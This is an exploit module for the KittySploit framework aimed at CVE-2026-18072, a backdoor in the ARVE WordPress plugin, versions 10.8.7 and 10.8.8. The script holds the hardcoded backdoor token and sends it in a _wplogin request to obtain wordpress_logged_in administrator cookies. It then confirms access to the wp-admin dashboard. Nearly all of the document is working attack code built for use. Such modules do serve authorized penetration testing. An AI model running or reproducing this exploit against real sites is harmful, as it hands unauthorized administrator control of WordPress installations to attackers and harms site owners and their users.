#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-18072 — ARVE compromised plugin admin session via _wplogin."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_BACKDOOR_TOKEN = "35fe7057ffed92ff7bc5a0b90f302a77fb5843ad6c972294d68da0b0553b3900"


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "ARVE CVE-2026-18072 backdoor admin session",
        "description": (
            "Auxiliary: triggers the hardcoded _wplogin token in ARVE 10.8.7/10.8.8 to obtain "
            "wordpress_logged_in cookies on the module HTTP client only — no KittySploit framework session."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-18072"],
        "tags": [
            "auxiliary", "wordpress", "arve", "backdoor", "auth-bypass", "cve-2026-18072"],
        "agent": {
            "approval_required": True,
            "produces": ["credentials", "risk_signals"],
        },
    }

    path = OptString("/", "WordPress base path", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        trigger = self.http_request(
            method="GET",
            path=self._join(f"/?_wplogin={_BACKDOOR_TOKEN}"),
            allow_redirects=False,
        )
        if not trigger or int(trigger.status_code or 0) != 302:
            print_error(f"Backdoor probe HTTP {getattr(trigger, 'status_code', None)}")
            return False
        cookie_names = [c.name for c in trigger.cookies]
        logged = [n for n in cookie_names if n.startswith("wordpress_logged_in_")]
        if not logged and "wordpress_logged_in" not in str(trigger.headers):
            print_error("No wordpress_logged_in cookie from backdoor")
            return False
        cookies = {c.name: c.value for c in trigger.cookies}
        admin = self.http_request(
            method="GET",
            path=self._join("/wp-admin/"),
            cookies=cookies,
            allow_redirects=True,
        )
        body = (admin.text or "") if admin else ""
        if admin and admin.status_code == 200 and ("dashboard" in body.lower() or "wp-admin-bar" in body):
            print_success("wp-admin reachable with module HTTP cookies (not a framework session)")
            if logged:
                print_status(f"Cookie: {logged[0]}")
            return True
        if logged:
            print_success(f"Received session cookie {logged[0]} (confirm wp-admin manually)")
            return True
        print_error("Session cookie missing or wp-admin not accessible")
        return False
